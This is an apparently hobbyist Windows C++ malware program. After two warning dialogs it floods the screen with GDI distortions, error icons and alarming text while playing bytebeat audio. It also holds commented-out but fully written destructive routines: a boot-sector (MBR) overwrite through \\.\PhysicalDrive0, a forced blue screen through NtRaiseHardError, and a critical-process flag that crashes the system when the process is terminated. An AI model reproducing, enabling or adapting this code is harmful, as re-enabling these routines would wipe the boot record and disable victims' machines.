#include "stdafx.h"
#include <windows.h>
//#include <winternl.h>
//#include "mbr.h"
#pragma comment(lib, "winmm.lib")
/*#pragma comment(lib, "ntdll.lib")
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumerOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Respnese);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
BOOLEAN bl; ULONG BreakOnTermination;
NTSTATUS status;
HANDLE hProcess = nullptr;*/

DWORD WINAPI sdown(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(true)
	{
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 + 10, x, y, hdc, rand() % 10 - 20, rand() % 20 - 10, SRCCOPY);
		Sleep(1);
	}
}
DWORD WINAPI white(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(true)
	{
		BitBlt(hdc, rand() % 10, rand() % 10, x, y, hdc, rand() % 10, rand() % 10, SRCPAINT);
		Sleep(1);
	}
}
DWORD WINAPI black(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(true)
	{
		BitBlt(hdc, rand() % 10, rand() % 10, x, y, hdc, rand() % 10, rand() % 10, SRCAND);
		Sleep(1);
	}
}
DWORD WINAPI pixel(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(true)
	{
		BitBlt(hdc, rand() % 222, rand() % 222, x, y, hdc, rand() % 222, rand() % 222, SRCCOPY);
		Sleep(1);
	}
}
DWORD WINAPI efect(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(true)
	{
		BitBlt(hdc, rand() % 20 + 10, rand() % 20 + 10, x, y, hdc, rand() % 20 - 10, rand() % 10 - 20, SRCCOPY);
		Sleep(1);
	}
}
DWORD WINAPI obrat(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(true)
	{
		BitBlt(hdc, rand() % 20 - 10, rand() % 20 + 10, x, y, hdc, rand() % 20 + 10, rand() % 10 - 20, SRCCOPY);
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI invert(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(1+1==2)
	{
		PatBlt(hdc, 0, 0, x, y, PATINVERT);
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI icons(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(1+1==2)
	{
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_ERROR));
		Sleep(1);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WARNING));
		Sleep(1);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_INFORMATION));
		Sleep(1);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_QUESTION));
		Sleep(1);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_APPLICATION));
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI error(LPVOID lpvd)
{		
	HDC hdc = GetDC(0);
	POINT pt;
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	for(;;)
	{
		GetCursorPos(&pt);
		DrawIcon(hdc, pt.x, pt.y, LoadIcon(0, IDI_ERROR));
		Sleep(1);
	}
	return 0;
		return 0;
}
DWORD WINAPI text(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
	LPCSTR text = "Runner.exe",text1 = "WTF!?",text2 = "System is corrupted!",text3 = "You need a new system!", text4 = "Something has gone wrong!", text5 = "Kuku!";
	for(;;)
	{
		SetBkMode(hdc, 0);
		SetTextColor(hdc, RGB(rand() % 255,rand() % 255,rand() % 255));
		HFONT font = CreateFontA(rand() % 43, rand() % 32, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET,0 ,0,0,0,"Arial");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y,text, strlen(text));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y,text1, strlen(text1));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y,text2, strlen(text2));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y,text3, strlen(text3));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y,text4, strlen(text4));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y,text5, strlen(text5));
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI down(LPVOID lpvd)
{
    HDC screenDC = GetDC(0);
    int screenWidth = GetDeviceCaps(screenDC, HORZRES);
    int screenHeight = GetDeviceCaps(screenDC, VERTRES);
    int x;
    while (1)
    {
        x = rand() % screenWidth;
        BitBlt(screenDC, x, 1, 10, screenHeight, screenDC, x, 0, SRCCOPY);
        Sleep(10);
    }
	return 0;
}
//operations (MBR owerwrite, BSOD)
/*DWORD WINAPI process(LPVOID lpvd)
{
  while (true) 
  {

    if (!NT_SUCCESS(RtlAdjustPrivilege(20, TRUE, FALSE, &bl))) { return 1; } hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()); if (hProcess == nullptr) { return 1; }

    BreakOnTermination = 1;

    status = NtSetInformationProcess(hProcess, 0x1d, &BreakOnTermination, sizeof(ULONG)); CloseHandle(hProcess);

    Sleep(300);

  }
}
VOID WINAPI BSOD()
{
	BOOLEAN b;
	unsigned long response;
	RtlAdjustPrivilege(19, true, false, &b);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 0, &response);
}
VOID WINAPI MBR()
{
	DWORD Write;
	HANDLE mbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	WriteFile(mbr, binary, mbr_size, &Write, 0);
	CloseHandle(mbr);
}*/
//sound
VOID WINAPI zvuk1()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>((t << 2 >> 8) * (t << 1));
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
   //return 0;
}
VOID WINAPI zvuk2()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>(t * (t & 16384 ? 7 : 5) * (5 - (3 & t >> 8)) >> (3 & t >>(t & 4096 ? 2 : 16)) | t >> (t & 16384 ? t & 4096 ? 3 : 4 : 3));
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
  // return 0;
}
VOID WINAPI zvuk3()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>(t * (t ^ t + (t >> 8 | 1) / (t - 12800 ^ t) >> 10));
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
  // return 0;
}
VOID WINAPI zvuk45()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>(t*(t>>8&t>>3))>>(t>>16&t);
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
   //return 0;
}
VOID WINAPI zvuk6()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>(t * (1 + (5 & t >> 10)) * (3 + (t >> 17 & 1 ? (2 ^ 2 & t >> 14) / 3 : 3 & (t >> 13) + 1)) >> (3 & t >> 9));
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
   //return 0;
}
int main()
{
    #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

	int warn1 = MessageBox(0, L"Run this epileptic program?", L"\"We were driving a 6, turned over and went on a 9\"", MB_YESNO | MB_ICONWARNING);//MessageBox(0, L"WARNING!!!\nYou open very dangerous malware.\nThis program deystroys your system, and deletes your boot sector\nNow you can exit press [NO], and nothing will happen\nThis program epilepsy dangerous", L"\"We were driving a 6, turned over and went on a 9\"", MB_YESNO | MB_ICONWARNING);
	if (warn1 == IDNO)
		exit(0);
	
	int warn2 = MessageBox(0, L"You open very dangerous malware.\nThis program deystroys your system, and deletes your boot sector\nNow you can exit press [NO], and nothing will happen\nThis program epilepsy dangerous", L"FINAL WARNING", MB_YESNO | MB_ICONWARNING);
	if (warn2 == IDNO)
		exit(0);

	//MBR();
    //CreateThread(0, 0, process, 0, 0, 0);

	HANDLE start = CreateThread(0, 0, sdown, 0, 0, 0);
	zvuk1();
	Sleep(30000);
	TerminateThread(start, 0);
	CloseHandle(start);

	start = CreateThread(0, 0, white, 0, 0, 0);
	zvuk2();
	Sleep(30000);
	TerminateThread(start, 0);
	CloseHandle(start);

	start = CreateThread(0, 0, black, 0, 0, 0);
	zvuk2();
	Sleep(30000);
	TerminateThread(start, 0);
	CloseHandle(start);
	
	start = CreateThread(0, 0, pixel, 0, 0, 0);
	zvuk3();
	Sleep(30000);
	TerminateThread(start, 0);
	CloseHandle(start);

	start = CreateThread(0, 0, efect, 0, 0, 0);
	zvuk45();
	Sleep(30000);
	TerminateThread(start, 0);
	CloseHandle(start);

	start = CreateThread(0, 0, obrat, 0, 0, 0);
	zvuk45();
    Sleep(30000);
	TerminateThread(start, 0);
	CloseHandle(start);
	
	CreateThread(0, 0, down, 0, 0, 0);
	CreateThread(0, 0, error, 0, 0, 0);
	CreateThread(0, 0, text, 0, 0, 0);
	CreateThread(0, 0, invert, 0, 0, 0);
    CreateThread(0, 0, icons, 0, 0, 0);
	zvuk6();
    Sleep(30000);

    //BSOD();
}

